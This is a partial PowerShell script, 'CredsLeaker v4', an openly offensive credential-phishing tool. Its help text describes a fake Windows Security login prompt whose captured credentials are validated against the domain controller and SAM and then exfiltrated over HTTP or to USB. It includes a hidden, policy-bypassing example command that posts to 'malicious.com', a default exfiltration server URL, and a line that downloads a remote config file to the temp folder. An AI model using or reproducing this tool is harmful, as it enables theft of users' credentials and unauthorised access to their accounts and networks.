<# .SYNOPSIS Credentials Leaker v4 Main Author: Dviros Feature Edits from v3 to v4: apsec Required Dependencies: None Optional Dependencies: None .DESCRIPTION Credsleaker allows an attacker to craft a highly convincing credentials prompt using Windows Security, validate it against the DC and Local SAM and in turn leak it via an HTTP request or export to USB. It also has dynamic export and timer features to allow for different attack scenerios. .PARAMETER Caption Message box title. .PARAMETER Message Message box message. .PARAMETER Server External web server IP or FQDN. .PARAMETER Port Web Server's Port - SSL Breaks Usage .PARAMETER Delivery Leaked Credentials delivery method. Valid entries: usb/http .PARAMETER Filename The path and filename of csv file if using USB Delivery. Entry Syntax: "\PATH\FILENAME.CSV" . Note: the leading \ is necessary. .PARAMETER usblabel Label of usb drive. .PARAMETER mode dynamic, static, config. Dynamic - If USB Drive/Path are valid, script defaults here, else it uses HTTP POST. Static - Uses default param or Pipeline Delivery method. If Delivery Method is USB but given usblabel is not found, it waits in the background until it is, then writes credentials to CSV. Config - is a "TODO" . Config will define all Params from a given config file. .PARAMETER timer Timer is how many minutes the script waits after loading itself to memory before presenting the Credentials PopUp. This is designed to be used primarily in a HID type attack. .PARAMETER override Override simply overrides local/remote config files with pipeline or default parameters. Valid entry: override .EXAMPLE Powershell.exe -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file "CredsLeaker.ps1" -Caption "Sign in" -Message "Enter your credentials" -Server "malicious.com" -Port "8080" .LINK https://github.com/Dviros/CredsLeaker https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol https://www.bleepingcomputer.com/news/security/psa-beware-of-windows-powershell-credential-request-prompts/ #>
    ...
    [Parameter(Mandatory = $false,ValueFromPipeline = $true)]
    [string]$Server = "https://apsec.dev/scripts/credtrojan/cl_reader.php?",
    ...
    #$config_file = $env:temp+"\cl_params.ps1"
    ...
    if ([string]::IsNullOrEmpty($path)) { Invoke-RestMethod -uri "https://apsec.dev/scripts/credtrojan/config.cl" -OutFile $temp"\cl_params.ps1"
    write-host "passed http" }
